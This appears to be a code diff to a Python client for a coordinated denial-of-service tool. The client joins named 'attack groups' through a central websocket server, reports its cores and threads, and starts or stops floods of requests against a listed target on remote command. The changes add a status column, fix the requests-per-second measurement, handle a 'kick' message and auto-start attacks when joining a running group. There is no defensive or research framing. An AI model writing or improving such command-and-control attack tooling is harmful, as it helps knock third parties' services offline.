@@ -23,7 +23,9 @@ def print_group(group_name):
     old_groups = {}
     while not group_name[0]:
         groups = requests.get(f'http://{IP}/group/json').json()
-        if groups == old_groups: continue
+        if groups == old_groups:
+            time.sleep(5)
+            continue
 
         old_groups = groups
         console.clear()
@@ -33,13 +35,15 @@ def print_group(group_name):
         table.add_column('Target')
         table.add_column('Members')
         table.add_column('Power/Threads')
+        table.add_column('Status')
 
         for group in groups:
             info = groups[group]
-            name, target, members, power = group, info['target'], str(info['members_count']), str(info['threads'])
-            table.add_row(name, target, members, power)
+            name, target, members, power, status = group, info['target'], str(info['members_count']), str(info['threads']), info['status']
+            table.add_row(name, target, members, power, status)
         console.print(table)
         console.print("Join Group - Name >", end='')
+
         time.sleep(5)
 
 threading.Thread(target=print_group, args=(group_name,)).start()
@@ -90,6 +94,7 @@ class Attack:
 
     def stalk_stats(self):
         old_total_reqs = 0
+        last_time = time.time()
         while self.status:
             total_reqs = 0
             for pid in self.pids:
@@ -100,12 +105,24 @@ class Attack:
                     print(f'Failed to read', pid)
                     continue
                 total_reqs += reqs
-            #print('Total Reqs', total_reqs)
-            difference = (total_reqs - old_total_reqs) / 2
-            print(f'{difference} requests per second, total: {total_reqs}')
-            ws.send(json.dumps({'p': 'analytics', 'per_second': difference, 'total': total_reqs}))
+
+            req_time_count = (total_reqs - old_total_reqs)
+            time_passed = time.time() - last_time
+            
+            # req_time_count : time_passed = x : 1
+            # req_time_count * 1 / time_passed
+            # req_time_count / time_passed
+
+            if time_passed != 0:
+                req_per_second = req_time_count / time_passed
+            else:
+                req_per_second = 0
+
+            print(f'{req_per_second} R/s, total: {total_reqs}')
+            ws.send(json.dumps({'p': 'analytics', 'per_second': req_per_second, 'total': total_reqs}))
             old_total_reqs = total_reqs
-            time.sleep(2)
+            last_time = time.time()
+            time.sleep(1)
 
 attack = Attack()
 
@@ -115,7 +132,8 @@ def on_message(ws, message):
         attack.start_attack()
     elif data['p'] == 'stop-attack':
         attack.stop_attack()
-    
+    elif data['p'] == 'kick':
+        ws.close()
 
 def on_error(ws, error):
     attack.stop_attack()
@@ -127,6 +145,8 @@ def on_close(ws, close_status_code, close_msg):
 def on_open(ws):
     ws.send(json.dumps({'p': 'identify', 'username': 'traba'}))
     ws.send(json.dumps({'p': 'join-group', 'name': group_name[0], 'cores': cores, 'threads': threads * processes}))
+    if groups[group_name[0]]['status'] == 'RUNNING':
+        attack.start_attack()
 
 if __name__ == "__main__":
     websocket.enableTrace(True)
